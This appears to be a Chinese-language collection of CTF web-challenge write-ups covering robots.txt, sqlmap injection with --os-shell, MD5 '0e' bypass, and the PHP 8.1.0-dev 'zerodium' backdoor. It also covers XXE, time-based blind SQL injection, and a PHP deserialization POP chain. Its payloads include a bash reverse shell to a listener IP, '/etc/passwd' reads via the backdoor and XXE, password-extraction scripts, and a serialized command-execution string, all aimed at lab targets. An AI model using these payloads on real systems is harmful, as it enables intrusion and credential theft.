# Robots

## 题目描述

昨天十三年社团讲课，讲了Robots.txt的作用，小刚上课没有认真听课正在着急，你能不能帮帮忙

## 解答

1. 在URL后加上/Robot.txt文件后缀，访问该网页
2. 提示不允许访问的页面文件
3. 进入该文件
4. 得到flag

## 总结

> 可以通过在题目中发现的信息来给URL后加上某些文件后缀，并以此访问到一些信息。

# 文章管理系统

## 题目描述

这是我们的文章管理系统，快来看看有什么漏洞可以拿到FLAG吧？注意：可能有个假FLAG哦。

## 提示

你需要命令执行才能拿到最终FLAG（确信）

## 解答

假的Flag

1. 使用kali里的sqlmap工具来进行sql注入语句扫描

   ```shell
   sqlmap -u  “http://challenge.qsnctf.com:31645/?id=1”  --dbs
   ```

2. 逐个查看扫描读取得到的数据库

   ```shell
   sqlmap -u http://challenge.qsnctf.com:31645/?id=1 -D ctftraining -T test --dump
   ```

3. 查看Word表的articles列

   ```shell
   sqlmap -u http://challenge.qsnctf.com:31645/?id=1 -D word -T articles--dump
   ```

4. 得到flag

真的Flag

1. 用sqlmap执行Shell

   ```shell
   sqlmap -u "http://challenge.qsnctf.com:32030/?id=1" --os-shell
   ```

2. 进入os-shell后，查找“Flag”

   ```shell
   find / -name “flag”
   ```

3. 发现并查看/Flag目录

   ```shell
   cat /flag
   ```

4. 得到Flag

## 补充知识

1. sqlmap参数含义

   ```shell
   -u 指定目标URL (可以是http协议也可以是https协议)
    
   -d 连接数据库
    
   --dbs 列出所有的数据库
    
   --current-db 列出当前数据库
    
   --tables 列出当前的表
    
   --columns 列出当前的列
    
   -D 选择使用哪个数据库
    
   -T 选择使用哪个表
    
   -C 选择使用哪个列
    
   --dump 获取字段中的数据
    
   --batch 自动选择yes
    
   --smart 启发式快速判断，节约浪费时间
    
   --forms 尝试使用post注入
    
   -r 加载文件中的HTTP请求（本地保存的请求包txt文件）
    
   -l 加载文件中的HTTP请求（本地保存的请求包日志文件）
    
   -g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试
    
   -o 开启所有默认性能优化
    
   --tamper 调用脚本进行注入
    
   -v 指定sqlmap的回显等级
    
   --delay 设置多久访问一次
    
   --os-shell 获取主机shell，一般不太好用，因为没权限
    
   -m 批量操作
    
   -c 指定配置文件，会按照该配置文件执行动作
    
   -data data指定的数据会当做post数据提交
    
   -timeout 设定超时时间
    
   --level 设置注入探测等级
    
   --risk 风险等级
    
   --identify-waf 检测防火墙类型
    
   --param-del="分割符" 设置参数的分割符
    
   --skip-urlencode 不进行url编码
    
   --keep-alive 设置持久连接，加快探测速度
    
   --null-connection 检索没有body响应的内容，多用于盲注
    
   --thread 最大为10 设置多线程
   
   sqlmap -u ["URL"] # 测试是否存在注入
   sqlmap -u ["URL"] -current-db #查询当前数据库
   sqlmap -u ["URL"] -D ["数据库名"] --tables #查询当前数据库中的所有表
   sqlmap -u ["URL"] -D ["数据库名"] -T ["表名"] --columns #查询指定库中指定表的所有列(字段)
   sqlmap -u ["URL"] -D ["数据库名"] -T ["表名"] -C ["列名"] --dump #打印出指定库中指定表指定列中的字段内容
   ```

2. sqlmap报错-连接重置的解决方法

   ```shell
   --random-agent
   ```

3. 重新安装新版的sqlmap

   1. 切换到目录/usr/share下查看是否存在sqlmap工具

      ```shell
      cd ./usr/share
      ```

   2. 删除sqlmap工具

      ```shell
      rm -rf sqlmap
      ```

   3. 重新安装sqlmap工具

      ```shell
      git clone http://github.com/sqlmapproject/sqlmap
      ```

## 总结

> 学会使用sqlmap扫描得到漏洞攻破点

# 黑客终端

## 题目描述

这是一个黑客终端，看你如何获得FLAG又快又准确？

## 解答

方法一：

1. 提示可以输入指令
2. 输入ls 列出所有文件
3. 发现有Flag
4. 输入 cat /flag
5. 得到flag

方法二：

1. 查看网页源代码
2. Ctrl键 + F 查找flag
3. 得到flag

## 总结

> 1.养成查看源代码的习惯
>
> 2.使用Linux命令，ls列出所有文件

# 此地无银三百两

## 题目描述

传说古代某人将银子埋在地里；怕人知道；就在上面竖一块木板；写道：“此地无银三百两”。邻里王二看见牌子；就把银子偷走；也插了个牌子；上面写：“隔壁王二不曾偷。”

## 解答

方法一：

1. 查看源代码
2. 查找flag
3. 得到flag

方法二：burpsuit

![image-20240410162948911](https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410162946770-876263489.png)

## 总结

> 查看源代码的方式
>
> 1. Ctrl键 + u
> 2. F12

# EasyMD5

## 题目描述

php没有难题

## 解答

1. 先随便上传，提示需要pdf文件

   ![image-20240410165446119](https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410165443609-942651557.png)

2. 提示需要MD5碰撞

   ![image-20240410165246419](https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410165244059-2129479859.png)

3. 得到flag

   ![image-20240410165745078](https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410165742522-231655517.png)

如果不用burpsuit抓包，会闪进报错。

## 补充知识

MD5碰撞

1. 此处使用的是搜索得来的任意两个MD5碰撞值
2. 所谓碰撞，就是输入不同的值Value和Value’得到相同的hash值

PHP中的MD5函数

```php
md5 ( string $str [, bool $raw_output = FALSE ] ) : string
```

“0E”绕过

```php
$_GET['name'] != $_GET['password']
MD5($_GET['name']) == MD5($_GET['password'])
```

1. PHP中==是判断值是否相等，若两个变量的类型不相等，则会转化为相同类型后再进行比较。
2. 满足上述规则时，可以使用以0E开头的hash值绕过
3. 因为PHP在处理哈希字符串的时候，PHP会将每一个以 **0E**开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 **0E**开头的，那么PHP会认为它们相同

## 总结

> 1. 没有思路时，可以先尝试上传，然后借助burpsuit查看页面报错/提示信息，再进一步修改
> 2. 利用网络搜索得到一些payload

# PHP的后门

## 题目描述

PHP竟然也会有后门这种东西？你知道吗！

## 解答

1. 页面提示PHP的版本

   <img src="https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410172522593-821761328.png" alt="image-20240410172525381" width="300" />

2. 查看PHP版本

   此处记得要在repeater中go一下看response，获得PHP版本

   ![image-20240410172454484](https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410172452296-110923961.png)

3. 从题目知道和后门有关，查询该版本PHP的后门

   后门存在于user-agentt:zerodium字段，后面加上相应的php函数，得到执行结果

4. 得到flag

   ![image-20240410173100990](https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410173058872-1878647754.png)

## 补充知识

PHP-8.1.0-dev 后门命令执行漏洞复现

1. 改包用的payload

   第二个直接获取账户信息，这里自由发挥吧

   ```shell
   User-Agentt: zerodiumvar_dump(2*3)
   User-Agentt: zerodiumsystem(“cat /etc/passwd”)
   ```

2. 建立监听

   nc -lvp 192.168.0.118:8080

3. 反弹Shell

   ```shell
   Payload如下：
   User-Agentt: zerodiumsystem(“bash -c ‘exec bash -i >& /dev/tcp/192.168.0.116/6666 0>&1’”);
   ```

   这时监听机应该就应该建立连接了Getshell！

## 总结

> 1. 要仔细观察题目和页面中给的提示
> 2. 如果用burpsuit直接搜索改包用的payload，的漏洞后门

# PHP的XXE

## 题目描述

XXE（XML External Entity）是一种针对XML解析器的攻击技术，也被称为XML外部实体注入攻击。当应用程序解析用户提供的XML输入时，如果没有正确地配置或过滤外部实体，攻击者可以利用这一漏洞执行恶意操作。

XML允许在文档中定义和使用外部实体，这些实体可以从外部资源（如文件、网络URL等）中获取数据。如果应用程序解析了包含恶意外部实体的XML输入，并且未对外部实体进行适当的处理或限制，攻击者可能会读取敏感文件、执行远程代码或进行其他恶意活动。

## 解答

1. 查看题目得知需要利用XXE，即XML外部实体注入攻击

2. 查看页面得知xml版本为2.8.0

3. 搜索该漏洞

4. 得到payload

   注意此处需要修改两处，才能得到flag

   1. 修改http后的代码，为漏洞点，触发bug
   2. 插入payload

   ![image-20240410175241667](https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410175239003-384154513.png)

5. 得到flag

## 补充知识

PHP环境 XML外部实体注入漏洞（XXE）

1. `dom.php`、`SimpleXMLElement.php`、`simplexml_load_string.php`均可触发XXE漏洞

2. 使用漏洞点 /simplexml_load_string.php（实测用别的也行）

3. payload

   ```php
   <?xml version="1.0" encoding="utf-8"?> 
       <!DOCTYPE xxe [
       <!ELEMENT name ANY >
       <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
       <root>
       	<name>&xxe;</name>
       </root>
    
   /* 
   1.读取任意文件
   file 协议，file:///etc//passwd
   php 协议，php://filter/read=convert.base64-encode/resource=index.php
   2.执行系统命令
   PHP环境中PHP的expect模块被加载
   expect://ipconfig
   3.内网探测
   http：//192.168.0.128:80
   参见：https://xz.aliyun.com/t/3357#toc-11
   */
   ```

4. 题中用"file:///flag"查看flag

5. 得到flag

## 总结

> 搜索漏洞寻找payload时，仔细观察修改点。有时可能需要修改多处

# Easy_SQLi

## 题目描述

Easy的SQLi

## 解答

1. 看到sql表单登录

2. 尝试sql注入，登录成功

   ![image-20240410181735589](https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240410181733406-164819039.png)

3. 利用脚本来进行sql注入攻击

4. 得到flag

## 补充知识

sql注入脚本

```py
import requests
import time
url = 'http://challenge.qsnctf.com:31966/login.php'#网站放这里
name = ""
for i in range(50):
    for j in range(31, 129):
        payload = f"1'^if(ascii(substr((select/**/group_concat(password)/**/from/**/users),{i}," \
                  f"1))={j},1,0)-- -"
        data = {
            'uname': payload
        }
        # 'case(ord(substr(database()from({})for(1))))when({})then(2)else(3)end'
        result = requests.post(url=url, data=data)
        if 'success' in result.text:
            name += chr(j)
            print('数据: %s' % name)
            print(url + payload.format(i, j))
            break
        else:
            continue
```

这段代码是一个 Python 脚本，旨在通过 SQL 注入攻击来获取网站中用户的密码。代码的逻辑：

1. 导入了 `requests` 和 `time` 模块。
2. 定义了目标网站的 URL。
3. 初始化了一个空字符串 `name`，用于存储获取到的密码。
4. 使用了两个嵌套的 `for` 循环。外层循环从 0 到 49，内层循环从 31 到 128，即 ASCII 码中可打印字符的范围。
5. 在每次循环中，构造了一个 SQL 注入 payload，将其作为用户名 (`uname`) 发送给目标网站。payload 中的 SQL 语句用于检查数据库中用户密码的每个字符。
6. 如果网站返回的响应中包含了 `success` 字符串，则表示当前尝试的字符是密码中的一部分。程序将该字符添加到 `name` 变量中，并打印出当前已获取的密码。
7. 如果没有找到正确的字符，则继续内层循环。
8. 当找到密码的每个字符后，程序会打印出完整的密码。

```py
import requests
import time
url = 'http://challenge.qsnctf.com:31966/login.php'#网站放这里
res = ""

for i in range(1, 48, 1):
    for j in range(32, 128, 1):
        payload = f"if(ascii(substr((select group_concat(password) from users),{i},1))>{j},sleep(0.5),0)#"
        data = {
            'uname': "admin' and " + payload,
            'psw': 123456
        }
        try:
            r = requests.post(url=url, data=data, timeout=0.2)
        except Exception as e:
            continue

        res += chr(j)
        print(res)
        break
```

用于通过时间延迟盲注攻击来获取网站中用户的密码。代码的逻辑：

1. 导入了 `requests` 和 `time` 模块。

2. 定义了目标网站的 URL。

3. 初始化了一个空字符串 `res`，用于存储获取到的密码。

4. 使用了两个嵌套的 `for` 循环。外层循环从 1 到 47，内层循环从 32 到 127，即 ASCII 码中可打印字符的范围。

5. 在每次循环中，构造了一个 SQL 注入 payload，该 payload 通过比较密码的每个字符的 ASCII 值，如果大于当前尝试的 ASCII 值，则执行一个时间延迟操作（`sleep(0.5)`）。

   当构造 SQL 注入 payload 时，代码会使用 `f-string` 格式化字符串的方法，将注入的 SQL 语句嵌入到用户名 (`uname`) 中的字符串中。

   具体来说，payload 的构造涉及到以下几个步骤：

   1. `substr((select group_concat(password) from users),{i},1)`: 这部分 SQL 语句用于从数据库中获取用户密码中的每个字符。其中，`substr` 函数用于截取字符串的一部分，第一个参数是要截取的字符串，第二个参数是截取的起始位置，第三个参数是截取的长度（这里固定为 1），这样就能逐个获取密码的每个字符。
   2. `ascii(...)`: 这部分 SQL 语句用于将获取到的字符转换为其对应的 ASCII 码值。
   3. `if(ascii(...)>{j},sleep(0.5),0)`: 这部分 SQL 语句构造了一个条件判断，如果获取到的字符的 ASCII 码值大于当前循环尝试的 ASCII 码值 `{j}`，则执行 `sleep(0.5)` 操作，即让程序等待 0.5 秒；否则，返回 0。这样就通过时间延迟来判断字符是否符合条件。
   4. `#`: 最后加上 `#` 是为了注释掉原始 SQL 语句的结尾，以防止与注入的 SQL 语句混淆。

   综上所述，每次循环都会构造一个包含 SQL 注入代码的 payload，该代码用于从数据库中逐个获取密码的字符，并根据条件判断是否正确，从而实现密码猜解的过程。

6. 发送构造的 payload 作为用户名 (`uname`) 和一个随意的密码 (`psw`) 给目标网站。

7. 使用 `try-except` 结构捕获请求可能的超时异常，以避免因为超时而中断程序。

8. 如果请求成功，表示当前尝试的字符是密码中的一部分。程序将该字符添加到 `res` 变量中，并打印出当前已获取的密码。

9. 如果没有找到正确的字符，则继续内层循环。

10. 当找到密码的每个字符后，程序会打印出完整的密码

## 总结

> sql注入居然有代码！
>
> sql盲注脚本

# 雏形系统

## 题目描述

今天是公司里的工程师小王被裁员的日子，但小王并没有闲着。在离开之前，他突发奇想，决定留下一份特别的礼物给公司，于是他设计了一个登录页面的雏形

## 解题

1. burpsuit抓包登录无果

2. dirsearch爆破一下目录

   ```shell
   dirsearch -u http://challenge.qsnctf.com:32147/ -e all
   ```

3. 发现/www.zip目录

   <img src="https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240411110717096-891707649.png" alt="image-20240411110718534" width="300" />

4. zip中得到两个文件，txt无用，PHP内容如下

   <img src="https://img2023.cnblogs.com/blog/3406637/202404/3406637-20240411111532623-483323211.png" alt="image-20240411111535476" width="300" />

5. 这道题用到的是`phpjm的混淆内容还原`，大致操作步骤理解为看到下边类似qsnctf.php文件类型的代码，需要你还原一下原来的代码长什么样子，具体操作方法有三个“手动解混淆”，“debug解混淆”，“编写脚本”。

   操作讲解：https://forum.butian.net/share/1476

6. 得到原来的代码后，配POP链

   ```php
   <?php
   class shi{}
   class wo{}
   class Demo{}
    
   $c=new Demo();
   $b=new shi();
   $a=new wo();
   $a->sex='boy';
   $a->age='eighteen';
   $a->intention=$b;
   $b->next=$c;
   $b->pass='cat /f*';
   echo serialize($a);
   #运行结果
   O:2:"wo":3:{s:3:"sex";s:3:"boy";s:3:"age";s:8:"eighteen";s:9:"intention";O:3:"shi":2:{s:4:"next";O:4:"Demo":0:{}s:4:"pass";s:7:"cat /f*";}}
   ```

7. 得到序列化代码

   ```php
   username=O:2:"wo":3:{s:3:"sex";s:3:"boy";s:3:"age";s:8:"eighteen";s:9:"intention";O:3:"shi":2:{s:4:"next";O:4:"Demo":0:{}s:4:"pass";s:7:"cat /f*";}}&password=system
   ```

8. 使用hackbar注入上述代码

9. 得到flag

手动解混淆

代码运行在线工具：https://tool.lu/coderunner

1. 首先将代码中的`eval`替换成`echo`，并且执行 php 文件
2. 然后把执行输出的代码复制替换掉前面整个`echo`语句(包括echo本身)
3. 接着重复工作，继续把下面的`eval`函数替换成`echo`输出。重复如此，最终成功还原成原来的代码

```php
<?php
   error_reporting(0);
   class shi
   {
       public $next;
       public $pass;
       public function __toString(){
           $this->next::PLZ($this->pass);
       }
   }
   class wo
   {
       public $sex;
       public $age;
       public $intention;
       public function __destruct(){
           echo "Hi Try serialize Me!";
           $this->inspect();
       }
       function inspect(){
           if($this->sex=='boy'&&$this->age=='eighteen')
           {
               echo $this->intention;
           }
           echo "🙅18岁🈲";
       }
   }
   class Demo
   {
       public $a;
       static function __callStatic($action, $do)
       {
           global $b;
           $b($do[0]);
       }
   }
   $b = $_POST['password'];
   $a = $_POST['username'];
   @unserialize($a);
   if (!isset($b)) {
       echo "==================PLZ Input Your Name!==================";
   }
   if($a=='admin'&&$b=="'k1fuhu's test demo")
   {
       echo("登录成功");
   }
   ?>
```

## 补充知识

dirsearch目录爆破工具

phpjm混淆内容还原

pop链构造

## 总结

> 路漫漫其修远兮，一时是补不来的。好深